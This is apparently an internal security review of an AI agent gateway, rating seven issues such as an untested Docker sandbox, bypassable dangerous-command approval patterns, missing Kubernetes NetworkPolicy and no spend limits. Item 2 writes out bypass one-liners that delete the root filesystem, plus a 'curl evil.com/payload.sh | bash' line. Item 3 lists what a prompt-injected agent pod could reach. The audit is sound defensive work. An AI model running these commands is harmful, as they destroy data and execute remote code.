# Priority Issues — Security & Architecture

> Identified 2026-03-27. Each item includes evidence from the codebase and a severity assessment.

---

## 1. DockerSandboxExecutor has zero test coverage

**File:** `gateway/executors/docker.py` (273 lines)
**Tests:** None found in `tests/`

This is the **only sandbox option on Windows**. The executor has:
- A port allocation race condition (concurrent spawns could grab the same port)
- No file locking on the state persistence file (`~/.logos/docker_instances.json`)
- No integration test for the spawn → health-check → delete lifecycle
- `container_id` parsing assumes Docker stdout format (`result.stdout.strip()[:12]`)

**Risk:** Windows users get an untested sandbox path. Failures will be discovered in production.

**Severity:** HIGH — this is the primary Windows isolation path.

---

## 2. Dangerous command patterns are bypassable

**File:** `tools/approval.py:29-56`

The approval system catches common destructive shell commands (`rm -rf /`, `find / -delete`, `chmod 777`, `DROP TABLE`, etc.) but can be trivially bypassed with:

- `python3 -c "import shutil; shutil.rmtree('/')"` — interpreted language one-liner
- `perl -e 'system("rm -rf /")'`
- `curl http://evil.com/payload.sh | bash` — remote code execution
- `node -e "require('fs').rmSync('/', {recursive: true})"` — Node.js

The `python[23]?\s+-[ec]` pattern (line 49) catches the Python command but doesn't validate what code is being executed inside the string literal.

Users see "approval required for dangerous commands" and may believe they're fully protected.

**Real defense layers (working):**
- Workspace scoping (`tools/workspace.py`) — symlink-safe, well-tested
- Toolset enforcement — agents can only call enabled tools
- API key filtering — terminal subprocesses don't receive provider secrets
- Sandbox containers — filesystem isolation when Docker/k8s is used

**Risk:** The pattern matcher is one layer in a defense-in-depth stack, but it's the most visible one to users. If it's the only layer they're relying on (bare metal / local process mode), it's insufficient.

**Severity:** MEDIUM — mitigated by other layers, but misleading in local-process mode.

---

## 3. No NetworkPolicy in k8s — agent pods have unrestricted network access

**Files:** `k8s/09-rbac.yaml`, `k8s/` (no NetworkPolicy manifest)

RBAC restricts what the `logos` service account can create via the Kubernetes API, but there are zero NetworkPolicies restricting what agent pods in the `hermes` namespace can reach over the network.

A compromised or prompt-injected agent pod can:
- Scan the entire cluster internal network
- Reach other services (databases, monitoring, etc.)
- Exfiltrate data to any external endpoint
- Access the Kubernetes API server (metadata endpoint)

The README says "Kubernetes pod + RBAC boundary" but RBAC governs API access, not network access. These are orthogonal security controls.

**Risk:** The k8s deployment mode is presented as "strongest self-hosted isolation" but lacks network-level enforcement.

**Severity:** HIGH — this is the production deployment path for homelabs and teams.

---

## 4. MCP server subprocesses have no reconnection logic

**File:** `gateway/mcp_service.py:162`

If an MCP server subprocess crashes (OOM, segfault, npm error), it stays dead. `is_connected()` checks `server.session is not None` but there's no health monitoring loop or automatic restart. Recovery requires a full gateway restart.

**Severity:** MEDIUM — affects MCP users only, clear error returned to agents.

---

## 5. `not-needed` API key placeholder

**File:** `gateway/run.py:234`

When no API key is configured, the code sends `api_key="not-needed"` to the OpenAI SDK, which sends `Authorization: Bearer not-needed` to the inference server. This works because LM Studio currently ignores invalid tokens when auth is disabled, but it's a fragile assumption.

**Severity:** LOW — works today, should be replaced with proper auth detection.

---

## 6. Config.yaml changes require gateway restart (not communicated)

**File:** `gateway/run.py:64-148`

`.env` is reloaded before each chat request, but `config.yaml` is only read at startup. The settings UI doesn't indicate that changes require a restart.

**Severity:** LOW — UX issue, not a safety issue.

---

## 7. No per-session spend limit or cost estimation

**File:** `agents/hermes/agent.py:265`

`max_iterations=90` is the only guard against runaway API spend. No per-user budget, no cost warning, no circuit breaker. A complex prompt on a frontier model could generate significant costs in one turn.

**Severity:** MEDIUM — financial risk for self-hosted users with cloud API keys.
